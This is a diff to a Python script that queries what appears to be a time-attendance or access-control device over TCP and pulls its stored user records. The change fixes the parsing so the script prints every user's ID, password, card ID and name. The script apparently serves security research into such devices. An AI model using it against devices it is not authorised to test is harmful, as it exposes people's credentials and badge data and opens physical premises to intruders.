@@ -144,7 +144,7 @@ def makePayload(command, data='', CH=b"\x00\x00\x00\x00"):
 def sendPayload(ip, port, payload):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
-    print("[*] Sending payload: %s" % binascii.hexlify(payload))
+    #print("[*] Sending payload: %s" % binascii.hexlify(payload))
     s.send(payload)
     response = s.recv(512)
     s.close()
@@ -158,7 +158,7 @@ def sendPayload(ip, port, payload):
     size = struct.unpack(">H", size)[0]
 
 
-    print("[*] Response: %s" % binascii.hexlify(response))
+    #print("[*] Response: %s" % binascii.hexlify(response))
 
     # sanity check for data integrity
     if (len(response) != (9 + int(size) + 2)):  # 9 bytes from previous values plus size of the packet plus 2 bytes for CRC16
@@ -247,40 +247,50 @@ def getUserRecords(ip, port=5010, CH=b"\x00\x00\x00\x00"):
     new_record_amount = data[16:18]
 
     user_amount = struct.unpack(">H", user_amount)[0]
-    print("[*] user_amount: %d" % int(user_amount))
+    print("\n[*] Number of users: %d\n" % int(user_amount))
 
-
+    user_count = 0
     payload_data = b'\x01\x0c'
     for i in range(0, (int(user_amount)%12)): # data length: 12*30 = 360Byte
         payload = makePayload(CMD_DOWNLOAD_USERS, data=payload_data, CH=CH)
         (preamble, deviceCode, ack, returnValue, size, data, crc) = sendPayload(ip, port, payload)
         payload_data = b'\x00\x0c'
+        user_count_page = 0
+        base = 1
 
-        print("[*] data: %s" % data)
+        # print("[*] data: %s" % data)
 
-        counter = 0
-        base = 1+counter*12
-        user_id = data[base+1:(base+5)]
-        passwd_len = data[base+5] >> 4
+        while user_count < user_amount and user_count_page < 12:
+            user_id = data[base+1:(base+5)]
+            passwd_len = data[base+5] >> 4
 
-        # temporary dirty fix for passwd just to make it work
-        passwd = binascii.hexlify(data[(base+5):(base+8)])[1:6] # ignore first 4 bits for password length
-        prepend_bits = bytearray(b'0')
-        password_array = bytearray(passwd)
-        password_array = prepend_bits + password_array
-        passwd = int.from_bytes(codecs.decode(password_array, 'hex'), byteorder="big", signed=True)
-        user_id = struct.unpack(">I", user_id)[0]
+            # temporary dirty fix for passwd just to make it work
+            passwd = binascii.hexlify(data[(base+5):(base+8)])[1:6] # ignore first 4 bits for password length
+            prepend_bits = bytearray(b'0')
+            password_array = bytearray(passwd)
+            password_array = prepend_bits + password_array
+            passwd = int.from_bytes(codecs.decode(password_array, 'hex'), byteorder="big", signed=True)
+            user_id = struct.unpack(">I", user_id)[0]
 
-        print("[*] User: %s" % user_id)
-        print("[*] Password_len: %s" % passwd_len)
-        print("[*] Password: %s" % passwd)
-        print("[*] Password (Bytes28): %s" % data[base+27])
+            card_id = data[(base+8):(base+12)]
+            name = data[(base+12):(base+22)]
+            department = data[(base+23)]
+            group = data[(base+24)]
+            attendance_mode = data[(base+25)]
+            fp_enroll_state = data[(base+26):(base+27)]
+            pwd_last_8_digit = data[(base+28)]
+            keep = data[(base+29)]
+            special_info = data[(base+30)]
 
-        pwd = data[(base+6):(base+8)]
-        card_id = data[(base+9):(base+12)]
-        counter = counter+1
+            print("[*] User: %s" % user_id)
+            print("[*] Password_len: %s" % passwd_len)
+            print("[*] Password: %s" % passwd)
+            print("[*] Card ID: %s" % card_id)
+            print("[*] Name: %s" % name)
 
-        print("[*] new_record_amount: %s" % size)
+            user_count = user_count + 1
+            user_count_page = user_count_page + 1
+            base = base + 30
 
     return (preamble, deviceCode, ack, returnValue, size, data, crc)
 
